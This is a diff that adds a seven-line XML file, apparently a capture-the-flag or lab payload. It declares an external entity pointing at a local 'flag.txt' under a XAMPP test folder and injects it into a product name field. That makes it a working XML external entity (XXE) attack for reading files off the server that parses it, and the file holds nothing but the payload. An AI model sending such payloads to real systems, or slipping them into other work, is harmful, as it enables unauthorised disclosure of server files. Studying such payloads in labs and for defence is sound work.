@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "D:/Xampp/htdocs/Test/flag.txt">
+]>
+<product>
+  <name>&xxe;</name>
+</product>
